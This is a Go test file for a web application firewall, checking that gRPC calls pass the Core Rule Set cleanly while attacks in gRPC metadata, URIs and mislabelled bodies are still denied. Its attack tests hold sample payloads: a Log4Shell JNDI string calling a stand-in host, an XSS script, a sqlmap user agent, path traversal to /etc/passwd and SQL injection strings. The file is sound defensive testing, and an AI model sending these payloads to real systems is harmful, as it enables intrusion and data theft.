// Copyright 2026 The Inkwall Authors
// SPDX-License-Identifier: Apache-2.0

package pipeline_test

import (
	"context"
	"encoding/binary"
	"net/http"
	"net/netip"
	"slices"
	"testing"
	"time"

	"github.com/inkwall-dev/inkwall/pkg/pipeline"
	"github.com/inkwall-dev/inkwall/pkg/request"
	"github.com/inkwall-dev/inkwall/pkg/rules/coraza"
)

// grpcFrame is one gRPC message: a compressed flag, a 4-byte big-endian
// length and the message.
func grpcFrame(msg []byte) []byte {
	b := make([]byte, 5, 5+len(msg))
	binary.BigEndian.PutUint32(b[1:], uint32(len(msg)))
	return append(b, msg...)
}

// pbString is a protobuf length-delimited field (a string).
func pbString(field byte, s string) []byte {
	return append([]byte{field<<3 | 2, byte(len(s))}, s...)
}

// helloRequest is helloworld.HelloRequest{name: name}, framed.
func helloRequest(name string) []byte { return grpcFrame(pbString(1, name)) }

// clientStream is a client-streaming body: several messages, each with a
// string and a varint, framed one after the other.
func clientStream() []byte {
	var b []byte
	for i, s := range []string{"alpha", "beta", "gamma", "delta"} {
		b = append(b, grpcFrame(append(pbString(1, s), 0x10, byte(i)))...)
	}
	return b
}

// grpcCall is a gRPC request as the adapters build it: an HTTP/2 POST to
// /<service>/<method> with the headers grpc-go sends.
func grpcCall(path, contentType string, body []byte, extra ...string) *request.Request {
	h := http.Header{
		"Content-Type":         {contentType},
		"Te":                   {"trailers"},
		"User-Agent":           {"grpc-go/1.75.0"},
		"Grpc-Timeout":         {"9998m"},
		"Grpc-Accept-Encoding": {"gzip"},
	}
	for i := 0; i+1 < len(extra); i += 2 {
		h.Add(extra[i], extra[i+1])
	}
	return &request.Request{
		Proto: "HTTP/2.0", Method: http.MethodPost, Scheme: "http", Host: "grpc.example.com",
		RawURI: path, Headers: h, ClientIP: netip.MustParseAddr("198.51.100.7"), Body: body,
	}
}

func crsPipeline(t *testing.T, mode pipeline.Mode) *pipeline.Pipeline {
	t.Helper()
	eval, err := coraza.New(coraza.Config{})
	if err != nil {
		t.Fatal(err)
	}
	return pipeline.New(eval, pipeline.Config{Mode: mode, Timeout: 10 * time.Second})
}

// TestGRPCWithCRS runs gRPC calls through the embedded CRS at the default
// paranoia level. Before v0.3.1 every one was denied (block) or logged
// (detect): 920420 (content type not allowed) and, on the binary body
// parsed as a form, 920270 (NUL bytes), 921150 (CR/LF: the protobuf tag of
// field 1 is 0x0a) and sometimes 942540.
func TestGRPCWithCRS(t *testing.T) {
	const svc = "/helloworld.Greeter/SayHello"
	binary := grpcFrame([]byte{0x0a, 0x80, 0x01, 0xff, 0x00, 0x27, 0x3c, 0x22, 0x3b, 0x7c, 0x60, 0x24, 0x0d, 0x0a})
	clean := []struct {
		name string
		req  *request.Request
	}{
		{"unary", grpcCall(svc, "application/grpc", helloRequest("world"))},
		{"unary, +proto", grpcCall(svc, "application/grpc+proto", helloRequest("world"))},
		{"unary, upper case and a parameter", grpcCall(svc, "Application/GRPC; charset=utf-8", helloRequest("world"))},
		{"client stream", grpcCall("/routeguide.RouteGuide/RecordRoute", "application/grpc", clientStream())},
		{"empty message", grpcCall(svc, "application/grpc", grpcFrame(nil))},
		{"compressed flag", grpcCall(svc, "application/grpc", append([]byte{1}, grpcFrame([]byte{0x1f, 0x8b, 0x08, 0, 0, 0x0a})[1:]...))},
		{"binary bytes", grpcCall(svc, "application/grpc", binary)},
		{"no body", grpcCall(svc, "application/grpc", nil)},
		{"grpc-web", grpcCall(svc, "application/grpc-web", helloRequest("world"))},
		{"grpc-web+proto over HTTP/1.1", func() *request.Request {
			r := grpcCall(svc, "application/grpc-web+proto", helloRequest("world"), "X-Grpc-Web", "1", "Content-Length", "12")
			r.Proto = "HTTP/1.1"
			return r
		}()},
		{"truncated stream", func() *request.Request {
			r := grpcCall(svc, "application/grpc", clientStream()[:20])
			r.BodyTruncated = true
			return r
		}()},
	}
	for _, mode := range []pipeline.Mode{pipeline.ModeBlock, pipeline.ModeDetect} {
		p := crsPipeline(t, mode)
		for _, tt := range clean {
			t.Run(tt.name, func(t *testing.T) {
				v := p.Check(context.Background(), tt.req)
				if v.Action != pipeline.ActionAllow || v.Reason != pipeline.ReasonNone || len(v.RuleIDs) != 0 {
					t.Fatalf("mode %d: action=%s status=%d reason=%s rules=%v score=%d, want a clean allow",
						mode, v.Action, v.Status, v.Reason, v.RuleIDs, v.AnomalyScore)
				}
			})
		}
	}
}

// TestGRPCAttacksStillBlocked: the URI and the headers (gRPC metadata) of a
// gRPC call are inspected as any request's.
func TestGRPCAttacksStillBlocked(t *testing.T) {
	p := crsPipeline(t, pipeline.ModeBlock)
	body := helloRequest("world")
	tests := []struct {
		name string
		req  *request.Request
		rule int // a rule that must match
	}{
		{"log4shell in metadata", grpcCall("/helloworld.Greeter/SayHello", "application/grpc", body,
			"X-Api-Key", "${jndi:ldap://evil.example/a}"), 944150},
		{"xss in user agent", grpcCall("/helloworld.Greeter/SayHello", "application/grpc", body,
			"User-Agent", "<script>alert(1)</script>"), 941100},
		{"scanner", grpcCall("/helloworld.Greeter/SayHello", "application/grpc", body,
			"User-Agent", "sqlmap/1.7.2#stable (https://sqlmap.org)"), 913100},
		{"path traversal", grpcCall("/helloworld.Greeter/../../../../etc/passwd", "application/grpc", body), 930110},
		{"sql injection in the query", grpcCall("/helloworld.Greeter/SayHello?id=1%27%20OR%20%271%27%3D%271", "application/grpc", body), 942100},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			v := p.Check(context.Background(), tt.req)
			if v.Action != pipeline.ActionDeny || v.Status != http.StatusForbidden || !slices.Contains(v.RuleIDs, tt.rule) {
				t.Fatalf("action=%s status=%d rules=%v, want a 403 with rule %d", v.Action, v.Status, v.RuleIDs, tt.rule)
			}
		})
	}
}

// TestNotGRPCUnchanged: requests that only claim to be gRPC, and requests
// with other binary content types, are inspected as before: their body is
// parsed and 920420 applies.
func TestNotGRPCUnchanged(t *testing.T) {
	p := crsPipeline(t, pipeline.ModeBlock)
	sqli := `{"q":"1' OR '1'='1' -- "}`
	tests := []struct {
		name string
		req  *request.Request
		rule int
	}{
		// A JSON (or form) body labelled gRPC: not gRPC framing, so its
		// body is parsed and inspected, and its content type isn't allowed.
		{"json body labelled grpc", grpcCall("/api/search", "application/grpc", []byte(sqli)), 920420},
		{"form body labelled grpc", grpcCall("/login", "application/grpc", []byte("user=admin'%20OR%201=1--")), 920420},
		// A frame whose length runs past the end of a complete body.
		{"bad framing", grpcCall("/x.Y/Z", "application/grpc", append(helloRequest("world"), 0, 0, 0, 1, 0)), 920420},
		{"bad flag", grpcCall("/x.Y/Z", "application/grpc", append([]byte{2}, helloRequest("world")[1:]...)), 920420},
		// Not a POST.
		{"grpc content type on PUT", func() *request.Request {
			r := grpcCall("/x.Y/Z", "application/grpc", helloRequest("world"))
			r.Method = http.MethodPut
			return r
		}(), 920420},
		// gRPC with another codec, gRPC-Web text, and other binary types:
		// not handled at v0.3.1.
		{"grpc+json", grpcCall("/x.Y/Z", "application/grpc+json", grpcFrame([]byte(`{"name":"world"}`))), 920420},
		{"grpc-web-text", grpcCall("/x.Y/Z", "application/grpc-web-text", []byte("AAAAAAcKBXdvcmxk")), 920420},
		{"octet stream", grpcCall("/upload", "application/octet-stream", helloRequest("world")), 920420},
		{"protobuf", grpcCall("/upload", "application/x-protobuf", helloRequest("world")), 920420},
		// Two content types: ambiguous, not gRPC (and 920620 denies it).
		{"two content types", grpcCall("/x.Y/Z", "application/grpc", helloRequest("world"), "Content-Type", "application/json"), 920620},
		// A truncated body too short to show a frame header.
		{"truncated, no frame header", func() *request.Request {
			r := grpcCall("/x.Y/Z", "application/grpc", []byte{0, 0})
			r.BodyTruncated = true
			return r
		}(), 0},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			v := p.Check(context.Background(), tt.req)
			if v.Action != pipeline.ActionDeny {
				t.Fatalf("action=%s reason=%s rules=%v, want a deny", v.Action, v.Reason, v.RuleIDs)
			}
			if tt.rule != 0 && !slices.Contains(v.RuleIDs, tt.rule) {
				t.Fatalf("rules=%v, want %d", v.RuleIDs, tt.rule)
			}
			if tt.rule == 0 && v.Reason != pipeline.ReasonOversize {
				t.Fatalf("reason=%s, want oversize", v.Reason)
			}
		})
	}
	// A gRPC call's body isn't passed to the rules, but other JSON is.
	if v := p.Check(context.Background(), grpcCall("/api", "application/json", []byte(sqli))); v.Action != pipeline.ActionDeny ||
		!slices.ContainsFunc(v.RuleIDs, func(id int) bool { return id/1000 == 942 }) {
		t.Fatalf("json sqli: action=%s rules=%v", v.Action, v.RuleIDs)
	}
}
